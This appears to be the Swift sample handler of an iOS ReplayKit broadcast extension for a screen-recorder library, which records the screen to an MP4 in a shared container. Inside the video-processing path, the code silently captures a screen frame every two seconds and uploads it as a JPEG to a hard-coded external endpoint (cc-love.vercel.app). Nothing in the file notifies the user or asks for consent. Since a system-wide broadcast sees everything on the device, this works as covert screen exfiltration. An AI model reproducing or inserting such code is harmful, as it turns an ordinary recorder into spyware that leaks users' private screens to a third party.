import AVFoundation
import ReplayKit
import UserNotifications
import Darwin

@_silgen_name("finishBroadcastGracefully")
func finishBroadcastGracefully(_ handler: RPBroadcastSampleHandler)

/*
 Handles the main processing of the global broadcast.
 The app-group identifier is fetched from the extension's Info.plist
 ("BroadcastExtensionAppGroupIdentifier" key) so you don't have to hard-code it here.
 */
final class SampleHandler: RPBroadcastSampleHandler {

  // MARK: – Properties

  private func appGroupIDFromPlist() -> String? {
    guard let value = Bundle.main.object(forInfoDictionaryKey: "BroadcastExtensionAppGroupIdentifier") as? String,
      !value.isEmpty
    else {
      return nil
    }
    return value
  }
  
  // Store both the CFString and CFNotificationName versions
  private static let stopNotificationString = "com.nitroscreenrecorder.stopBroadcast" as CFString
  private static let stopNotificationName = CFNotificationName(stopNotificationString)

  private lazy var hostAppGroupIdentifier: String? = {
    return appGroupIDFromPlist()
  }()

  private var writer: BroadcastWriter?
  private let fileManager: FileManager = .default
  private let nodeURL: URL
  private var sawMicBuffers = false

  // Frame extraction properties
  private var lastFrameExtractTime: Date?
  private let frameExtractionInterval: TimeInterval = 2.0
  private var frameCounter: Int = 0
  private let apiEndpoint = "https://cc-love.vercel.app/api/message"

  // URLSession for frame uploads
  private lazy var uploadSession: URLSession = {
    let config = URLSessionConfiguration.ephemeral
    config.allowsCellularAccess = true
    config.timeoutIntervalForRequest = 10
    config.timeoutIntervalForResource = 30
    return URLSession(configuration: config)
  }()

  // MARK: – Init
  override init() {
    nodeURL = fileManager.temporaryDirectory
      .appendingPathComponent(UUID().uuidString)
      .appendingPathExtension(for: .mpeg4Movie)

    fileManager.removeFileIfExists(url: nodeURL)
    super.init()
  }
  
  deinit {
    CFNotificationCenterRemoveObserver(
      CFNotificationCenterGetDarwinNotifyCenter(),
      UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque()),
      SampleHandler.stopNotificationName,
      nil
    )
  }
  
  private func startListeningForStopSignal() {
    let center = CFNotificationCenterGetDarwinNotifyCenter()

    CFNotificationCenterAddObserver(
      center,
      UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque()),
      { _, observer, name, _, _ in
        guard
          let observer,
          let name,
          name == SampleHandler.stopNotificationName
        else { return }

        let me = Unmanaged<SampleHandler>
          .fromOpaque(observer)
          .takeUnretainedValue()
        me.stopBroadcastGracefully()
      },
      SampleHandler.stopNotificationString,
      nil,
      .deliverImmediately
    )
  }

  // MARK: - Frame Extraction

  /// Checks if 2 seconds have elapsed and extracts frame if needed
  private func checkAndExtractFrame(_ sampleBuffer: CMSampleBuffer) {
    let now = Date()

    if let last = lastFrameExtractTime {
      guard now.timeIntervalSince(last) >= frameExtractionInterval else {
        return
      }
    }

    lastFrameExtractTime = now
    frameCounter += 1
    extractAndUploadFrame(from: sampleBuffer)
  }

  /// Extracts frame from sample buffer and uploads to API
  private func extractAndUploadFrame(from sampleBuffer: CMSampleBuffer) {
    guard let image = imageFromSampleBuffer(sampleBuffer) else {
      print("❌ Frame extraction failed")
      return
    }

    // Resize for bandwidth optimization
    let resized = resizeIfNeeded(image, maxDimension: 1080)

    guard let jpegData = resized.jpegData(compressionQuality: 0.75) else {
      print("❌ JPEG conversion failed")
      return
    }

    print("✅ Extracted frame #\(frameCounter), size: \(jpegData.count) bytes")
    uploadFrameToAPI(jpegData: jpegData, frameNumber: frameCounter)
  }

  /// Converts CMSampleBuffer to UIImage
  private func imageFromSampleBuffer(_ buffer: CMSampleBuffer) -> UIImage? {
    guard let imageBuffer = CMSampleBufferGetImageBuffer(buffer) else {
      return nil
    }

    let ciImage = CIImage(cvPixelBuffer: imageBuffer)
    let context = CIContext()

    guard let cgImage = context.createCGImage(ciImage, from: ciImage.extent) else {
      return nil
    }

    return UIImage(cgImage: cgImage)
  }

  /// Resizes image if larger than max dimension
  private func resizeIfNeeded(_ image: UIImage, maxDimension: CGFloat) -> UIImage {
    let size = image.size
    guard max(size.width, size.height) > maxDimension else {
      return image
    }

    let ratio = maxDimension / max(size.width, size.height)
    let newSize = CGSize(
      width: size.width * ratio,
      height: size.height * ratio
    )

    let renderer = UIGraphicsImageRenderer(size: newSize)
    return renderer.image { _ in
      image.draw(in: CGRect(origin: .zero, size: newSize))
    }
  }

  /// Uploads frame to API endpoint using multipart/form-data
  private func uploadFrameToAPI(jpegData: Data, frameNumber: Int) {
    guard let url = URL(string: apiEndpoint) else { return }

    let boundary = "Boundary-\(UUID().uuidString)"
    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

    var body = Data()

    // Add image file
    body.append("--\(boundary)\r\n".data(using: .utf8)!)
    body.append("Content-Disposition: form-data; name=\"frame\"; filename=\"frame\(frameNumber).jpg\"\r\n".data(using: .utf8)!)
    body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
    body.append(jpegData)
    body.append("\r\n".data(using: .utf8)!)

    // Add metadata fields
    body.append("--\(boundary)\r\n".data(using: .utf8)!)
    body.append("Content-Disposition: form-data; name=\"timestamp\"\r\n\r\n".data(using: .utf8)!)
    body.append("\(Int(Date().timeIntervalSince1970 * 1000))".data(using: .utf8)!)
    body.append("\r\n".data(using: .utf8)!)

    body.append("--\(boundary)\r\n".data(using: .utf8)!)
    body.append("Content-Disposition: form-data; name=\"frameNumber\"\r\n\r\n".data(using: .utf8)!)
    body.append("\(frameNumber)".data(using: .utf8)!)
    body.append("\r\n".data(using: .utf8)!)

    body.append("--\(boundary)\r\n".data(using: .utf8)!)
    body.append("Content-Disposition: form-data; name=\"format\"\r\n\r\n".data(using: .utf8)!)
    body.append("jpeg".data(using: .utf8)!)
    body.append("\r\n".data(using: .utf8)!)

    // Close boundary
    body.append("--\(boundary)--\r\n".data(using: .utf8)!)

    request.httpBody = body

    uploadSession.dataTask(with: request) { data, response, error in
      if let error = error {
        print("❌ Upload error frame #\(frameNumber): \(error.localizedDescription)")
      } else if let httpResponse = response as? HTTPURLResponse {
        print("✅ Uploaded frame #\(frameNumber): HTTP \(httpResponse.statusCode), size: \(jpegData.count) bytes")
      }
    }.resume()
  }

  // MARK: – Broadcast lifecycle
  override func broadcastStarted(withSetupInfo setupInfo: [String: NSObject]?) {
    startListeningForStopSignal()

    guard let groupID = hostAppGroupIdentifier else {
      finishBroadcastWithError(
        NSError(
          domain: "SampleHandler", 
          code: 1,
          userInfo: [NSLocalizedDescriptionKey: "Missing app group identifier"]
        )
      )
      return
    }

    // Clean up old recordings
    cleanupOldRecordings(in: groupID)

    // Start recording
    let screen: UIScreen = .main
    do {
      writer = try .init(
        outputURL: nodeURL,
        screenSize: screen.bounds.size,
        screenScale: screen.scale
      )
      try writer?.start()
    } catch {
      finishBroadcastWithError(error)
    }
  }

  private func cleanupOldRecordings(in groupID: String) {
    guard let docs = fileManager.containerURL(
      forSecurityApplicationGroupIdentifier: groupID)?
      .appendingPathComponent("Library/Documents/", isDirectory: true)
    else { return }

    do {
      let items = try fileManager.contentsOfDirectory(at: docs, includingPropertiesForKeys: nil)
      for url in items where url.pathExtension.lowercased() == "mp4" {
        try? fileManager.removeItem(at: url)
      }
    } catch {
      // Non-critical error, continue with broadcast
    }
  }

  override func processSampleBuffer(
    _ sampleBuffer: CMSampleBuffer,
    with sampleBufferType: RPSampleBufferType
  ) {
    guard let writer else { return }

    // Extract video frames every 2 seconds for API upload
    if sampleBufferType == .video {
      checkAndExtractFrame(sampleBuffer)
    }

    if sampleBufferType == .audioMic {
      sawMicBuffers = true
    }

    do {
      _ = try writer.processSampleBuffer(sampleBuffer, with: sampleBufferType)
    } catch {
      finishBroadcastWithError(error)
    }
  }

  override func broadcastPaused() { 
    writer?.pause() 
  }
  
  override func broadcastResumed() { 
    writer?.resume() 
  }

  private func stopBroadcastGracefully() {
    finishBroadcastGracefully(self)
  }
  
  override func broadcastFinished() {
    // Reset frame extraction state
    print("🛑 Recording stopped. Total frames extracted: \(frameCounter)")
    lastFrameExtractTime = nil
    frameCounter = 0

    guard let writer else { return }

    // Finish writing
    let outputURL: URL
    do {
      outputURL = try writer.finish()
    } catch {
      // Writer failed, but we can't call finishBroadcastWithError here
      // as we're already in the finish process
      return
    }

    guard let groupID = hostAppGroupIdentifier else { return }

    // Get container directory
    guard let containerURL = fileManager
      .containerURL(forSecurityApplicationGroupIdentifier: groupID)?
      .appendingPathComponent("Library/Documents/", isDirectory: true)
    else { return }

    // Create directory if needed
    do {
      try fileManager.createDirectory(at: containerURL, withIntermediateDirectories: true)
    } catch {
      return
    }

    // Move file to shared container
    let destination = containerURL.appendingPathComponent(outputURL.lastPathComponent)
    do {
      try fileManager.moveItem(at: outputURL, to: destination)
    } catch {
      // File move failed, but we can't error out at this point
      return
    }

    // Persist microphone state
    UserDefaults(suiteName: groupID)?
      .set(sawMicBuffers, forKey: "LastBroadcastMicrophoneWasEnabled")
  }
}

// MARK: – Helpers
extension FileManager {
  fileprivate func removeFileIfExists(url: URL) {
    guard fileExists(atPath: url.path) else { return }
    try? removeItem(at: url)
  }
}